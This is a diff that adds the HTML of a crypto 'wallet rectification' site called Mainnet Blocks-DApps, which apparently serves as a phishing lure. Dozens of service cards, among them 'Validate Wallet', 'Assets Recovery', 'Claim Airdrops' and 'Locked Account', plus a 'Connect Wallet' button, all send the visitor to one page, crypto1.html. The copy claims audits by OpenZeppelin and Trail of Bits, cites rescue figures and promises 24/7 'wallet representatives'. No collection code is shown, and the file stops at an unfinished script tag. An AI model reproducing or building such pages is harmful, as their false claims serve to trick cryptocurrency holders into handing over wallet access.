@@ -1,0 +1,1103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>elite rectifier</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <style>
+    
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      scroll-behavior: smooth;
+   
+  
+    
+    }
+    body {
+      background-image: url('ICON/tokenstreet-vbPk2tB2HrU-unsplash.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      width: 100%;
+
+      margin: 0;
+      margin-left: 50px;
+     
+      
+    }
+    @keyframes popUpFromBottom {
+      0% { transform: translateY(100px); opacity: 0; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+    .wrap {
+      text-align: center;
+      line-height: 1;
+      padding: 1rem 2rem;
+      margin-left: 50px;
+    }
+    .title {
+      font-weight: 900;
+      letter-spacing: .02em;
+      font-size: clamp(48px, 9vw, 140px);
+      text-transform: uppercase;
+      color: var(--text);
+      animation: popUpFromBottom 0.8s ease-out forwards;
+    }
+    .subtitle {
+      margin-top: .6rem;
+      font-weight: 600;
+      letter-spacing: .12em;
+      text-transform: uppercase;
+      font-size: clamp(14px, 2.2vw, 24px);
+      color: var(--accent);
+      animation: popUpFromBottom 0.8s ease-out forwards;
+      animation-delay: 0.4s;
+      opacity: 0;
+    }
+    header {
+      background: transparent;
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-image: url('ICON/fantasy-scene-wealth.jpg');
+    }
+    img.logo-spin {
+      width: 200px;
+      animation: spin 7s linear infinite;
+      background-color: transparent;
+      border-radius: 8px;
+    }
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    /* Menu */
+    .menu-btn {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      cursor: pointer;
+      z-index: 1001;
+    }
+    .menu-btn span {
+      height: 3px;
+      width: 25px;
+      background: white;
+      border-radius: 2px;
+      transition: all 0.3s ease;
+    }
+    nav {
+      position: fixed;
+      top: 0;
+      right: -250px;
+      background: #232844;
+      padding: 60px 0;
+      transition: right 0.3s ease;
+      z-index: 1000;
+      width: max-content;
+      min-width: 180px;
+      height: auto;
+      border-radius: 0 0 0 8px;
+    }
+    nav a {
+      display: block;
+      padding: 12px 20px;
+      text-decoration: none;
+      color: white;
+      transition: background 0.2s;
+      white-space: nowrap;
+    }
+    nav a:hover { background: #4da3ff; }
+    nav.open { right: 0; }
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 999;
+    }
+    .overlay.show { display: block; }
+
+    .container {
+      
+    }
+  </style>
+</head>
+
+<body class="text-white">
+  <div class="container">
+
+  
+  <!-- Header -->
+  <header class="flex justify-between items-center px-6 py-4 border-b border-gray-800 bg-black bg-opacity-50">
+    <div class="flex items-center gap-2">
+      <img class="logo-spin" src="ICON/chatgpt.png" alt="Rotating Bitcoin Logo">
+    </div>
+    <div class="wrap">
+      <div class="title">WEB3</div>
+      <div class="subtitle">BLOCKCHAIN INTEGRATION</div>
+    </div>
+    <div class="menu-btn" id="menu-btn">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+  </header>
+
+  <div class="overlay" id="overlay"></div>
+  <nav id="menu">
+    <a href="#home">Home</a>
+    <a href="#faq">FAQ</a>
+    <a href="#roadmap">Roadmap</a>
+    <a href="#Services">Services</a>
+    <a href="#about"> About</a>
+   
+  </nav>
+  <body class="text-white">
+   
+    <div>
+      <style>
+        section {
+          justify-content: center; /* horizontal center */
+      align-items: center;     /* vertical center */
+      flex-direction: column;  /* stack items vertically */
+      gap: 1rem; /* space between elements */
+        }
+        .crypto-marquee {
+          width: 100%;
+          overflow: hidden;
+          background: transparent;
+          padding: 10px 0;
+        }
+        
+        .crypto-track {
+          display: flex;
+          gap: 40px;
+          animation: scroll 30s linear infinite;
+        }
+        
+        .crypto-item {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          min-width: 70px; /* keeps spacing consistent */
+        }
+        
+        .crypto-item img {
+          width: 40px;
+          height: 40px;
+          object-fit: contain;
+        }
+        
+        .crypto-item span {
+          color: white;
+          font-size: 0.8rem;
+          margin-top: 5px;
+        }
+        
+        @keyframes scroll {
+          0% {
+            transform: translateX(0);
+          }
+          100% {
+            transform: translateX(-50%);
+          }
+        }
+        </style>
+        
+        
+        <div class="crypto-marquee">
+          <div class="crypto-track">
+            <div class="crypto-item">
+              <img src="ICON/btc.jpeg" alt="Bitcoin">
+              <span>Bitcoin</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/download%20(10).png" alt="Ethereum">
+              <span>Ethereum</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/bsc.png" alt="BNB">
+              <span>BNB</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/download%20(9).png" alt="XRP">
+              <span>XRP</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/coinbase.png" alt="Coinbase">
+              <span>coinbase</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/download%20(8).png" alt="Dogecoin">
+              <span>Dogecoin</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/avalanche.png" alt="avalanche">
+              <span>avalanche</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/bitkeep.png" alt="bitkeep">
+              <span>bitkeep</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/bitpay.jpg" alt="bitpay">
+              <span>bitpay</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/download%20(2).jpeg" alt="Litecoin">
+              <span>Litecoin</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/cosmos.jpg" alt="cosmos">
+              <span>cosmos</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/bitski.png" alt="bitski">
+              <span>bitski</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/cosmos.jpg" alt="cosmos">
+              <span>cosmos</span>
+            </div>
+           
+            <div class="crypto-item">
+              <img src="ICON/ccvault.png" alt="ccvault">
+              <span>ccvault</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/download%20(11).png" alt="metamask">
+              <span>metamask</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/algorand.png" alt="algorand">
+              <span>algorand</span>
+            </div>
+           
+        
+        
+            <!-- Repeat for smooth loop -->
+            <div class="crypto-item">
+              <img src="ICON/btc.jpeg" alt="Bitcoin">
+              <span>Bitcoin</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/download%20(10).png" alt="Ethereum">
+              <span>Ethereum</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/bsc.png" alt="BNB">
+              <span>BNB</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/download%20(9).png" alt="XRP">
+              <span>XRP</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/coinbase.png" alt="Coinbase">
+              <span>coinbase</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/download%20(8).png" alt="Dogecoin">
+              <span>Dogecoin</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/download%20(11).png" alt="metamask">
+              <span>metamask</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/bitkeep.png" alt="bitkeep">
+              <span>bitkeep</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/bitpay.jpg" alt="bitpay">
+              <span>bitpay</span>
+            </div>
+            <div class="crypto-item">
+              <img src="ICON/cosmos.jpg" alt="cosmos">
+              <span>cosmos</span>
+            </div>
+            </div>
+          </div>
+        </div>
+        
+    </div>
+  <!-- Hero -->
+  <section id="home" class="flex flex-col items-center justify-center text-center py-16 px-4  " data-aos="fade-left ">
+    <h2 class="text-4xl font-bold mb-4">Securely Bridge Your Digital Assets</h2>
+    <p class="text-gray-400 max-w-2xl mb-8">
+      Connect your wallet and seamlessly transfer assets across multiple blockchains in seconds.
+    </p>
+    <a href="crypto1.html">
+    <button id="bridgeButton" class="bg-blue-600 px-6 py-3 rounded-lg font-semibold hover:bg-green-700 transition">
+      Connect Wallet
+    </button>
+    </a>
+  </section>
+    <style>
+      .logo {
+        height: 50px;
+        width: 50px;
+        color: white;
+        background-color: white;
+        border-radius: 10%;
+        margin-left: 140px;
+
+      }
+      .logoarran {
+        justify-content: space-between;
+        
+      }
+      .arran{
+       display: flex;
+       align-items: top;
+       justify-content: space-between;
+       margin: 0;
+       border: 2px;
+       border-color: rgb(11, 9, 9);
+       border: solid white;
+
+       border-radius: 10px;
+      
+      }
+     
+      .bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition{
+        display: flex;
+      }
+      h3 {
+        text-align: center;
+      }
+      .border {
+        border: 2px;
+       border-color: rgb(9, 16, 18);
+       border: solid white;
+       border-radius: 10px;
+       
+      }
+     section {
+      max-width: 1200px;
+      margin-left: 40px;
+     
+      
+
+     }
+     p{
+      font-size: 18px;
+      text-align: center;
+     }
+     .select {
+      font-size: 50px;
+      text-align: center;
+      font-weight: bold;
+      
+
+     }
+    </style>
+  <!-- Info Cards -->
+  <!-- AOS JS -->
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+<script>
+  AOS.init({
+    duration: 1200, // Animation speed (ms)
+   // once: true,     // Run animation only once
+  });
+</script>
+
+<div class="select">MAKE YOUR SELECTION BELOW</div>
+  
+  <section id="Services" class=" grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="fade-left">
+    <a href="crypto1.html">
+    <div class="arran">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition items-center justify-between">
+        <h3 class="text-xl font-semibold mb-2">Synchronize </h3>
+        <p class="text-gray-400 ">click  here to Synchronize your wallet on DApps mainnet.</p>        
+        <div class="logoarran">
+          <img class="logo" src="ICON/download%20(7).png">
+         </div>
+      </div>
+      </div>
+     </a>
+    </div>
+    
+    </div>
+    
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Validate Wallet</h3>
+          <p class="text-gray-400">click here for wallet validation related issue.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/images.png">
+           </div>
+        </div>
+        </a>
+        </div>
+    </div>
+
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Assets Recovery</h3>
+          <p class="text-gray-400">click here for assets recovery related issues.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/download%20(6).png">
+           </div>
+        </div>
+        </div>
+      </a>
+    </div>
+    
+  </section>
+  
+  <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="fade-up">
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Rectification</h3>
+          <p class="text-gray-400">click here for Rectification relate issues.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/hand_5773726.png">
+           </div>
+        </div>
+        </a>
+    </div>
+    
+     <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Gas Fee</h3>
+          <p class="text-gray-400">click here for Gas fee Issue related issue.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/gas.png">
+           </div>
+        </div>
+        </a>
+     </div>
+   
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Claim Reward</h3>
+          <p class="text-gray-400">click here for Claim reward related issues.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/key_7185520.png">
+           </div>
+        </div>
+      </div>
+        </a>
+    </div>
+  </section>
+  <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="fade-up">
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Swap or Exchange</h3>
+          <p class="text-gray-400">click here for Swap/Exchange relate issues.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/key_7185520.png">
+           </div>
+        </div>
+        </a>
+    </div>
+     
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Stalking Issue</h3>
+          <p class="text-gray-400">click here for Stalking Issue related issue.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/download%20(3).png">
+          </div>
+        </div>
+        </a>
+    </div>
+    
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Connect to Dappst</h3>
+         <p class="text-gray-400">click here for Connect to Dappst related issues.</p>
+         <div class="logoarran">
+          <img class="logo" src="ICON/download%20(1).png">
+         </div>
+        </div>
+      </div>
+      </a>
+    </div>
+   
+  </section>
+
+  <section id="Services" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="fade-left">
+   
+    <a href="crypto1.html">
+    <div class="arran">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition items-center justify-between">
+        <h3 class="text-xl font-semibold mb-2">Deposits & Withdrawals</h3>
+        <p class="text-gray-400">click here for Deposits & Withdrawals relate issues.</p>        
+        <div class="logoarran">
+          <img class="logo" src="ICON/download%20(7).png">
+         </div>
+      </div>
+      </div>
+     </a>
+    </div>
+    
+    </div>
+
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Slippage Error
+          </h3>
+          <p class="text-gray-400">click here for Slippage Error
+            related issue.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/images.png">
+           </div>
+        </div>
+      </a>
+    </div>
+    </div>
+   
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Cross Chain Transfer</h3>
+          <p class="text-gray-400">click here for Cross Chain Transfer related issues.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/download%20(6).png">
+           </div>
+        </div>
+        </div>
+      </a>
+    </div>
+   
+  </section>
+ 
+  <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="fade-up">
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">NFTS Issues</h3>
+          <p class="text-gray-400">click here for NFTS Issues relate issues.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/key_7185520.png">
+           </div>
+        </div>
+        </a>
+    </div>
+    
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Transaction Error</h3>
+          <p class="text-gray-400">click here for Transaction Error related issue.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/download%20(3).png">
+          </div>
+        </div>
+        </a>
+    </div>
+
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Bridging issues</h3>
+         <p class="text-gray-400">click here for Bridging issues related issues.</p>
+         <div class="logoarran">
+          <img class="logo" src="ICON/download%20(1).png">
+         </div>
+        </div>
+      </div>
+      </a>
+    </div>
+  </section>
+
+  
+  <section id="service" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="fade-up">
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Login Issues</h3>
+          <p class="text-gray-400">click here for Login Issues related issues.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/download.png">
+           </div>
+        </div>
+        </a>
+    </div>
+   <div class="border">
+    <a href="crypto1.html">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+        <h3 class="text-xl font-semibold mb-2">Claim Airdrops</h3>
+        <p class="text-gray-400">click here for Claim Airdrops related issue.</p>
+        <div class="logoarran">
+          <img class="logo" src="ICON/download.jpeg">
+         </div>
+      </div>
+      </a>
+   </div>
+      
+   <div class="border">
+    <a href="crypto1.html">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+        <h3 class="text-xl font-semibold mb-2">Missing/Irregular balance</h3>
+        <p class="text-gray-400">click here for Missing/Irregular balance related issues.</p>
+        <div class="logoarran">
+          <img class="logo" src="ICON/download%20(6).png">
+         </div>
+      </div>
+      </a>
+   </div>
+   
+  </section>
+
+  <section id="service" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="fade-up">
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Trading Issues</h3>
+          <p class="text-gray-400">click here for trading wallet related issues.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/download%20(4).png">
+           </div>
+        </div>
+        </a>
+    </div>
+      
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Locked Account</h3>
+          <p class="text-gray-400">click here for locked account related issue.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/download%20(2).png">
+           </div>
+        </div>
+        </a>
+    </div>
+      <div class="border">
+        <a href="crypto1.html">
+          <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+            <h3 class="text-xl font-semibold mb-2">Transaction Delay</h3>
+            <p class="text-gray-400">click here for transaction delay related issues.</p>
+            <div class="logoarran">
+              <img class="logo" src="ICON/download.png">
+             </div>
+          </div>
+          </a>
+      </div>
+   
+  </section>
+  <section id="service" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="fade-up">
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Fast Transactions</h3>
+          <p class="text-gray-400">Experience lightning-fast bridging without compromising security.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/key_7185520.png">
+           </div>
+        </div>
+        </a>
+    </div>
+   
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Multi-Chain Support</h3>
+          <p class="text-gray-400">Ethereum, Binance Smart Chain, Polygon, and more supported.</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/hand_5773726.png">
+           </div>
+        </div>
+        </a>
+    </div>
+
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Migration Issues</h3>
+          <p class="text-gray-400">click here for issues related to Migration Issues</p>
+          <div class="logoarran">
+            <img class="logo" src="ICON/download%20(5).png">
+           </div>
+        </div>
+        </a>
+    </div>
+   
+    
+  </section>
+
+  
+  <section id="about"  class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="fade-left">
+    <a href="crypto1.html">
+    <div class="arran">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition items-center justify-between">
+        <h2 class="text-xl font-semibold mb-2">About the platform </h2>
+        <p class="text-gray-400">SYNC AND TRACK</p>
+        <h2 class="text-xl font-semibold mb-2">Fully decentralized. Completely secure.</h2>
+        <p class="text-gray-400">We have all been in this industry too long not to make the security of your funds our absolute top priority. We’ve received multiple audits from Open Zeppelin and Trail of Bits, as well as code reviews from white hat researchers. </p>  
+        <h2 class="text-xl font-semibold mb-2">10,834 </h2> 
+        <p class="text-gray-400"> Accounts Successfully Rectified.</p> 
+
+        <h2 class="text-xl font-semibold mb-2">4,500+</h2>     
+        <p class="text-gray-400"> Collections Indexed every 5mins</p> 
+        
+       
+        
+        
+      </div>
+      </div>
+     </a>
+    </div>
+    
+    </div>
+    <div class="border">
+      <a href="crypto1.html">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <p class="text-gray-400">SYNC AND TRACK</p>
+          <h2 class="text-xl font-semibold mb-2">Built on Web3. </h2>
+          <h2 class="text-xl font-semibold mb-2"> Owned by you.</h2>
+          <p class="text-gray-400">Unlike Palpatine, we love democracy. That’s why our platform is designed to be governed by you. Want leveraged exposure on your favorite crypto assets? Get enough people from the DApps Mainnet community to back you and the protocol will automatically add it as an exchange. Want to passively earn high yields from trade fees and FST rewards? Simply provide liquidity.</p>
+         
+        </div>
+        </a>
+    </div>
+   
+    </div>
+   
+  </section>
+  
+  <style>
+   #about{
+    text-align:center;
+    justify-content: center; 
+    align-items: center;
+    
+      margin-left: 50px;
+      display: flex;
+    
+
+   }
+    .about{
+      text-align: center;
+      margin-left: 50px;
+      font-size: 50px;
+    }
+    .abou{
+      color: gray;
+      width: 700px;
+      text-align: center;
+      margin-left: 100px;
+      padding-left: 200px;
+    
+    }
+    .roadmap {
+      font-size: 50px;
+      
+      
+      justify-items: center;
+     
+
+     
+      text-align: center;
+    }
+  </style>
+  <div>
+    <P id="roadmap" class="roadmap">Mainnet's Blocks-DApps  Roadmap</P>
+  </div>
+
+  <section id="roadmap" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="zoom-in">
+    <div class="border">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+        <h3 class="text-xl font-semibold mb-2">STEP 01
+          </h3>
+        <p class="text-gray-400">
+          Objective
+          Our team of experts will help you investigate and identify the problem to ensure your funds and transactions remain secure and hassle-free..</p>
+  
+      </div>
+    </div>
+   
+    
+    <div class="border">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+        <h3 class="text-xl font-semibold mb-2">STEP 02
+          </h3>
+        <p class="text-gray-400">
+          Connect Wallet
+          Unlock the full potential of our decentralized application with a quick and secure wallet connection.
+          
+          </p>
+    </div>
+   
+     
+    </div>
+   
+     <div class="border">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+        <h3 class="text-xl font-semibold mb-2">STEP 03
+          </h3>
+        <p class="text-gray-400">
+          Validation
+          We meticulously verify and validate the authenticity of your wallet, safeguarding your cryptocurrency and digital holdings against unauthorized access.
+          
+          </p>
+     </div>
+   
+      
+    </div>
+ 
+  </section>
+ 
+  <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="zoom-in">
+    <div class="border">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+        <h3 class="text-xl font-semibold mb-2">        STEP 04
+          </h3>
+        <p class="text-gray-400">
+  
+  Troubleshoot
+  We specialize in troubleshooting, diagnosing, and fixing wallet-related problems swiftly and efficiently, ensuring your financial assets stay safe and accessible.</p>
+  
+      </div>
+      
+    </div>
+   <div class="border">
+    <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+      <h3 class="text-xl font-semibold mb-2">        STEP 05
+        </h3>
+      <p class="text-gray-400">
+
+Synchronize
+Our decentralized system ensure that your digital assets are seamlessly synchronized, providing you with uninterrupted access to your cryptocurrency holdings.
+        
+        </p>
+      <div class="logoarran">
+        
+       </div>
+    </div>
+   </div>
+
+   
+   
+     <div class="border">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+        <h3 class="text-xl font-semibold mb-2"> STEP 06
+          </h3>
+        <p class="text-gray-400">
+         
+          Optimized
+          Trust us to streamline your wallet's functionality, allowing you to transact and manage your funds with ease and confidence.
+          
+          </p>
+       
+      </div>
+     </div>
+    
+     
+ 
+    </section>
+ 
+    <div class="select">Why Choose Us?</div>
+    <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 px-6 pb-16 " data-aos="zoom-in">
+      <div class="border">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">       User-Friendly Platform
+            </h3>
+            
+          <p class="text-gray-400">
+    
+            Built with you in mind, our intuitive platform makes navigating and solving issues straightforward and stress-free.
+
+            <img src="ICON/why.png"></p>
+    
+        </div>
+        
+      </div>
+     <div class="border">
+      <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+        <h3 class="text-xl font-semibold mb-2">        24/7 Support
+          </h3>
+        <p class="text-gray-400">
+  
+          Our dedicated team is always available, around the clock, to provide you with expert assistance whenever you need it.
+  <img src="ICON/choose.png"> 
+          
+          </p>
+        <div class="logoarran">
+          
+         </div>
+      </div>
+     </div>
+  
+     
+     
+       <div class="border">
+        <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Trusted & Secure
+            </h3>
+          <p class="text-gray-400">
+           
+            We prioritize your safety by offering a secure and reliable platform that you can trust for all your needs.
+
+            <img src="ICON/us.png">
+            </p>
+         
+        </div>
+       </div>
+        
+       </section>
+       <div class="">
+        <div class="last">
+          <img src="ICON/do.png">
+        </div>
+       
+        <div class="">
+          <div class="bg-gray-900 p-6 rounded-lg shadow hover:shadow-lg transition">
+          <h3 class="text-xl font-semibold mb-2">Unlocking the Future
+          </h3>
+        <p class="text-gray-400">
+          This is not an app but a protocol that facilitates remote resolution between all noncustodial wallets by connecting you to the appropriate wallet representatives, ensuring effective communication and issue rectification.</p>
+          </div>
+        </div>
+          
+    
+        </div>
+       <style>
+        .last{
+            margin-left: 300px;
+       
+
+        }
+
+       </style>
+  </section>
+
+
+  <h2 id="faq" style="text-align:center; font-size:2rem; margin-bottom:20px;">Frequently Asked Questions</h2>
+    
+  <div class="faq-item">
+    <button class="faq-question">What is Mainnet Blocks-DApps ? <span>↓</span></button>
+    <div class="faq-answer">
+      <p> Mainnet Blocks-DApps is a platform designed to address common issues faced by Web3 applications, such as scalability, interoperability, and user adoption. We focus on creating a secure and efficient environment for decentralized applications to thrive.</p>
+    </div>
+  </div>
+
+  <div class="faq-item">
+    <button class="faq-question">How does Mainnet BlocksDApps ensure the security of my funds? <span>↓</span></button>
+    <div class="faq-answer">
+      <p>We prioritize the security of your funds above all else. Mainnet Blocks-DApps  has undergone multiple audits from renowned security firms such as Open Zeppelin and Trail of Bits. Additionally, our code has been reviewed by white hat researchers to ensure robust security measures are in place.</p>
+    </div>
+  </div>
+
+  <div class="faq-item " data-aos="fade-left" >
+    <button class="faq-question">Can I get leveraged exposure on my favorite crypto assets? <span>↓</span></button>
+    <div class="faq-answer " data-aos="fade-left">
+      <p>Yes, you can! If you gather enough support from the  Mainnet Blocks-DApps community, the protocol will automatically add the desired crypto asset as an exchange option, allowing leveraged exposure.</p>
+    </div>
+
+    <div class="faq-item " data-aos="fade-left">
+      <button class="faq-question">How can I earn high yields on Mainnet Blocks-DApps ? <span>↓</span></button>
+      <div class="faq-answer">
+        <p>You can passively earn high yields by providing liquidity on our platform. This enables you to earn trade fees and FST rewards, maximizing your earnings while contributing to the platform's liquidity.</p>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question">How is the platform governed? <span>↓</span></button>
+        <div class="faq-answer">
+          <p> Mainnet Blocks-DApps is designed to be governed by the community. Unlike centralized authorities, we believe in democracy and user participation. Community members can propose and vote on various aspects of the platform, ensuring that it evolves according to the users needs and preferences.</p>
+        </div>
+  </div>
+ </div>
+  </div>
+</section>
+
+<style>
+.faq-item {
+border-bottom: 1px solid #333;
+padding: 10px 0;
+}
+.faq-question {
+background: none;
+border: none;
+color: white;
+width: 50%;
+text-align: left;
+font-size: 1rem;
+padding: 10px 0;
+cursor: pointer;
+display: flex;
+justify-content: space-between;
+align-items: center;
+margin-left: 50px;
+}
+.faq-answer {
+max-height: 0;
+overflow: hidden;
+transition: max-height 0.3s ease;
+}
+.faq-answer p {
+margin: 10px 10px 10px;
+}
+.faq-item.active .faq-answer {
+max-height: 300px; /* enough for text */
+}
+.faq-item.active .faq-question span {
+transform: rotate(45deg);
+}
+.faq-question span {
+transition: transform 0.3s ease;
+}
+</style>
+<!-- Footer -->
+<footer style="background-color:#0f1220; color:white; text-align:center; padding:15px 0; font-family:Arial, sans-serif;">
+  &copy; 2024 . All Rights Reserved.
+</footer>
+
+
+<script>
